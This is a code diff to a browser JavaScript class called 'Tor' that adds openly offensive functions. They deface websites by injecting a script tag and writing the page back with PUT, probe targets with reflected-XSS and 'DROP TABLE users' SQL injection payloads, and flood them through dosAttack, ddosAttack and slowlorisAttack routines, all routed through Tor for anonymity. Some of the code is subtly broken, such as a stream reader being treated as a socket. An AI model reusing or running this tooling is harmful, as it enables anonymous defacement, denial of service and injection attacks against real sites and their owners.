@@ -51,6 +51,7 @@ class Tor {
         this.initRequestQueue();
         this.bypassCache = true;
         this.defaceScript = null;
+        this.httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
     }
 
     initRequestQueue() {
@@ -248,54 +249,233 @@ class Tor {
     }
 
     async defaceWebsite(url) {
-      if (!this.defaceScript) {
-        console.error('Deface script not set. Use setDefaceScript() first.');
-        return;
-      }
-
-      try {
-        const response = await this.fetchWithTor(url, { method: 'GET' });
-        if (!response.ok) {
-          throw new Error(`Failed to fetch the website. Status: ${response.status}`);
+        if (!this.defaceScript) {
+            console.error('Deface script not set. Use setDefaceScript() first.');
+            return;
         }
 
-        let targetContent = await response.text();
+        try {
+            const response = await this.fetchWithTor(url, { method: 'GET' });
+            if (!response.ok) {
+                throw new Error(`Failed to fetch the website. Status: ${response.status}`);
+            }
 
-        const scriptTag = `<script>${this.defaceScript}</script>`;
-        const injectionPoint = targetContent.indexOf('</body>');
+            let targetContent = await response.text();
 
-        if (injectionPoint !== -1) {
-          targetContent = targetContent.slice(0, injectionPoint) + scriptTag + targetContent.slice(injectionPoint);
-        } else {
-          targetContent += scriptTag;
+            const scriptTag = `<script>${this.defaceScript}</script>`;
+            const injectionPoint = targetContent.indexOf('</body>');
+
+            if (injectionPoint !== -1) {
+                targetContent = targetContent.slice(0, injectionPoint) + scriptTag + targetContent.slice(injectionPoint);
+            } else {
+                targetContent += scriptTag;
+            }
+
+            const options = {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'text/html',
+                    'User-Agent': this.userAgent,
+                    ...this.customHeaders
+                },
+                body: targetContent,
+                redirect: 'follow'
+            };
+
+            const putResponse = await this.fetchWithTor(url, options);
+
+            if (putResponse.ok) {
+                console.log('Website defaced successfully!');
+            } else {
+                console.error(`Failed to deface website. Status: ${putResponse.status}`);
+            }
+        } catch (error) {
+            console.error('Deface operation failed:', error);
         }
-
-        const options = {
-          method: 'PUT',
-          headers: {
-            'Content-Type': 'text/html',
-            'User-Agent': this.userAgent,
-            ...this.customHeaders
-          },
-          body: targetContent,
-          redirect: 'follow'
-        };
-
-        const putResponse = await this.fetchWithTor(url, options);
-
-        if (putResponse.ok) {
-          console.log('Website defaced successfully!');
-        } else {
-          console.error(`Failed to deface website. Status: ${putResponse.status}`);
-        }
-      } catch (error) {
-        console.error('Deface operation failed:', error);
-      }
     }
 
     setDefaceScript(script) {
-      this.defaceScript = script;
+        this.defaceScript = script;
     }
+
+    async genericRequest(url, method = 'GET', data = null, headers = {}) {
+        if (!this.httpMethods.includes(method.toUpperCase())) {
+            throw new Error(`Invalid HTTP method: ${method}`);
+        }
+
+        const options = {
+            method: method.toUpperCase(),
+            headers: {
+                'User-Agent': this.userAgent,
+                ...this.customHeaders,
+                ...headers
+            },
+            redirect: 'follow'
+        };
+
+        if (data) {
+            options.body = JSON.stringify(data);
+            options.headers['Content-Type'] = 'application/json';
+        }
+
+        try {
+            const response = await this.fetchWithTor(url, options);
+            return response;
+        } catch (error) {
+            console.error(`${method} request failed:`, error);
+            throw error;
+        }
+    }
+
+    async massRequest(url, method = 'GET', data = null, headers = {}, count = 10) {
+        const promises = [];
+        for (let i = 0; i < count; i++) {
+            promises.push(this.genericRequest(url, method, data, headers));
+        }
+        return Promise.all(promises);
+    }
+
+    async checkVulnerability(url) {
+      try {
+        const response = await this.fetchWithTor(url, { method: 'GET' });
+        if (!response.ok) {
+          console.warn(`Initial check failed with status: ${response.status}`);
+          return { vulnerable: false, details: `Initial check failed with status: ${response.status}` };
+        }
+
+        const reflectedXSSPayload = `<script>alert('XSS Vulnerability Detected!');</script>`;
+        const xssTestURL = `${url}?xss=${reflectedXSSPayload}`;
+
+        const xssResponse = await this.fetchWithTor(xssTestURL, { method: 'GET' });
+        const xssContent = await xssResponse.text();
+
+        if (xssContent.includes(reflectedXSSPayload)) {
+          return { vulnerable: true, type: 'Reflected XSS', details: `Reflected XSS payload detected in response.` };
+        }
+
+        const sqliPayload = "'; DROP TABLE users; --";
+        const sqliTestURL = `${url}?id=${sqliPayload}`;
+
+        try {
+          await this.fetchWithTor(sqliTestURL, { method: 'GET' });
+        } catch (sqliError) {
+          if (sqliError.message.includes('SQL syntax')) {
+            return { vulnerable: true, type: 'SQL Injection', details: `SQL syntax error indicates possible SQL Injection vulnerability.` };
+          }
+        }
+
+        return { vulnerable: false, details: 'No immediate vulnerabilities detected.' };
+      } catch (error) {
+        console.error('Vulnerability check error:', error);
+        return { vulnerable: false, details: `Vulnerability check error: ${error.message}` };
+      }
+    }
+
+    async dosAttack(url, requestsPerSecond = 10, duration = 60) {
+      const startTime = Date.now();
+      const endTime = startTime + (duration * 1000);
+      let requestCount = 0;
+
+      while (Date.now() < endTime) {
+        for (let i = 0; i < requestsPerSecond; i++) {
+          this.fetchWithTor(url, { method: 'GET' })
+            .then(response => {
+              if (!response.ok) {
+                console.warn(`Request failed with status: ${response.status}`);
+              }
+            })
+            .catch(error => {
+              console.error('Request error:', error);
+            });
+          requestCount++;
+        }
+
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+
+      console.log(`DOS attack completed. Total requests sent: ${requestCount}`);
+    }
+
+    async ddosAttack(url, threads = 50, duration = 60) {
+        const endTime = Date.now() + (duration * 1000);
+        let requestCount = 0;
+        let activeThreads = 0;
+
+        const attackThread = async () => {
+            activeThreads++;
+            while (Date.now() < endTime) {
+                try {
+                    const response = await this.fetchWithTor(url, { method: 'GET' });
+                    if (!response.ok) {
+                        console.warn(`Request failed with status: ${response.status}`);
+                    }
+                    requestCount++;
+                } catch (error) {
+                    console.error('Request error:', error);
+                }
+            }
+            activeThreads--;
+        };
+
+        const threadPromises = [];
+        for (let i = 0; i < threads; i++) {
+            threadPromises.push(attackThread());
+        }
+
+        await Promise.all(threadPromises);
+        console.log(`DDoS attack completed. Total requests sent: ${requestCount} with ${threads} threads.`);
+    }
+
+    async slowlorisAttack(url, sockets = 200, duration = 60) {
+        const endTime = Date.now() + (duration * 1000);
+        let socketCount = 0;
+
+        const sendKeepAlive = async (socket) => {
+            try {
+                const headers = {
+                    'User-Agent': this.userAgent,
+                    'Content-Length': '42',
+                    'Connection': 'keep-alive'
+                };
+                await this.rawPost(url, {}, headers);
+                if (Date.now() < endTime) {
+                    setTimeout(() => sendKeepAlive(socket), 15000);
+                } else {
+                    socket.destroy();
+                }
+            } catch (error) {
+                console.error('Slowloris error:', error);
+                socket.destroy();
+            }
+        };
+
+        const createSocket = () => {
+            if (socketCount < sockets && Date.now() < endTime) {
+                this.rawFetch(url)
+                    .then(response => {
+                        if (response.ok) {
+                            socketCount++;
+                            sendKeepAlive(response.body.getReader());
+                            setTimeout(createSocket, 100);
+                        } else {
+                            console.warn('Slowloris socket creation failed');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Socket creation error:', error);
+                    });
+            }
+        };
+
+        for (let i = 0; i < sockets; i++) {
+            createSocket();
+        }
+
+        console.log(`Slowloris attack started with ${sockets} sockets.`);
+        await new Promise(resolve => setTimeout(resolve, duration * 1000));
+        console.log('Slowloris attack completed.');
+    }
+
 }
 
 window.Tor = Tor;
